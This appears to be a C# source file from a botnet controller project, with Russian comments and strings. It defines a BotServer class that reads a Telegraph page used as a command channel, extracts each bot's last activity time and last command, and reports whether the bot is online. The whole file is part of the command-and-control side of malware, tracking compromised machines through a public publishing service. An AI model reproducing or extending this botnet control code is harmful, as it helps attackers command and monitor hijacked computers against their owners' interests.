using System;
using System.Text.RegularExpressions;

namespace botnet_telegraph_controller_yt
{
    public class BotServer
    {
        public string TelegraphPage { get; private set; }

        public string IP { get; set; } = "127.0.0.1";
        public string LastActivity { get; set; }
        public string LastCMD { get; set; }
        public string Online { get; set; }

        public string[] GetFullInfo()
        {
            return new string[] { IP, LastActivity, LastCMD, Online };
        }

        // добавить метод обновления статуса онлайна

        public BotServer(string telegraph_page_uri)
        {
            TelegraphPage = telegraph_page_uri;

            string html = web.GetHTML(telegraph_page_uri);

            Match regx = Regex.Match(html, "<p>(.*)</p></article>");
            string content = regx.Groups[1].Value;

            string[] cmd_array_content = Regex.Split(content, configs.spliter2);

            LastActivity = cmd_array_content[0];
            LastCMD = cmd_array_content[1];

            if(IsOnline(DateTime.Parse(LastActivity)) == true)
            {
                Online = "Онлайн";
            }
            else
            {
                Online = "Не в сети";
            }
        }

        private bool IsOnline(DateTime lastTimeActivity)
        {
            TimeSpan result = DateTime.Now - lastTimeActivity;

            if (result.Days == 0 && result.Hours == 0 && result.Minutes <= configs.MinutesBeforOffline)
            {
                return true;
            }
            else
            {
                return false;
            }
        }
    }
}
